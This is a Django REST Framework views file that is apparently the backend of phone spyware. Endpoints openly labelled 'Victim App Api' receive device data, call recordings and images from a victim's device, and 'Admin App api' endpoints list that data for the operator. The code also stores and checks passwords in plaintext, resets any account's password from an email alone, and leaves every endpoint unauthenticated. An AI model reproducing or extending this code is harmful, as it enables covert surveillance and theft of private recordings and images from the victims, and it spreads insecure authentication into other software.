from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from .seriallizers import Userserializers,Phonedataserializers,Forgetserializers,Audioserializers,Imageserializers
from .models import User,Phonedata,Audio,Image
from django.http import JsonResponse
# Use 'ISO-8859-1' instead of "utf-8" for decodin

from rest_framework.decorators import api_view

# Admin App api

class List_user(APIView):
    def get(self, request):
        users = Phonedata.objects.all()
        serializer = Phonedataserializers(users, many=True)
        return Response(serializer.data)


class Create_user(APIView):
    def post(self, request):
        serializer = Userserializers(data=request.data)
        email = request.data['email']
        if serializer.is_valid():
            if User.objects.filter(email=email).exists():
                return JsonResponse({'data': 'Email already exists'})
            else:
                serializer.save()
                return JsonResponse({'data': serializer.data})

class Login(APIView):
    def post(self, request):
        email = request.data['email']
        password = request.data['password']
        users = User.objects.all().filter(email=email)
        serializer = Userserializers(users, many=True)
        if serializer.data[0]['password'] == password:
            return JsonResponse({'data': 'Login successful'})
        else:
            return JsonResponse({'data': 'Invalid credentials'})


class Forget(APIView):
    def post(self, request):
        email = request.data['email']
        newpassword = User.objects.get(email=email)
        serializer = Forgetserializers(instance=newpassword, data=request.data)
        if serializer.is_valid():
            serializer.save()
        return JsonResponse({'status':status.HTTP_200_OK})



class Get_All_device(APIView):
    def post(self, request):
        users = User.objects.all().filter(email = request.data['email'])
        serializeruser = Userserializers(users, many=True)
        phons = Phonedata.objects.all().filter(email=request.data['email'])
        serializer = Phonedataserializers(phons, many=True)
        return JsonResponse({'data': serializer.data,'account': serializeruser.data});


# Victim App Api
class Phone_data_created(APIView):
    def post(self, request):
        serializer = Phonedataserializers(data=request.data)
        email = request.data['email']
        deviceid = request.data['deviceid']
        if serializer.is_valid():
            if User.objects.filter(email=email).exists():
                if Phonedata.objects.filter(deviceid=deviceid).exists():
                    id = Phonedata.objects.only('id').get(deviceid=deviceid).id
                    return JsonResponse({'status':status.HTTP_200_OK,'id': id})
                else:
                    serializer.save()
                return JsonResponse({'status':status.HTTP_200_OK,'id': serializer.data['id']})
            else:
                return JsonResponse({'status': 'Email not found'})

class Phone_data_Update(APIView):
    def post(self, request, pk):
        phonedb = Phonedata.objects.get(id=pk)
        serializer = Phonedataserializers(instance=phonedb, data=request.data)
        if serializer.is_valid():
            serializer.save()
        return Response(serializer.data)


class Audio_stor(APIView):
    def post(self, request):
        # serializer = Audioserializers(data=request.data)
        for audios in self.request.data:
            for audios in self.request.FILES.getlist(audios):
                _aud = Audioserializers(
                    data={
                        'deviceid': request.data['deviceid'],
                        'callrecoding': audios
                    }
                )
                if _aud.is_valid():
                    _aud.save()
        else:
            audlist = Audio.objects.all().filter(deviceid=request.data['deviceid'])
            serializer = Audioserializers(audlist, many=True)
            return JsonResponse({'data': serializer.data})


class Image_stor(APIView):
    def post(self, request):
        for image in self.request.data:
            for image in self.request.FILES.getlist(image):
                _img = Imageserializers(
                    data={
                        'deviceid': request.data['deviceid'],
                        'image': image
                    }
                )
                if _img.is_valid():
                    _img.save()
        else:
            imglist = Image.objects.all().filter(deviceid=request.data['deviceid'])
            serializer = Imageserializers(imglist, many=True)
            return JsonResponse({'data': serializer.data})

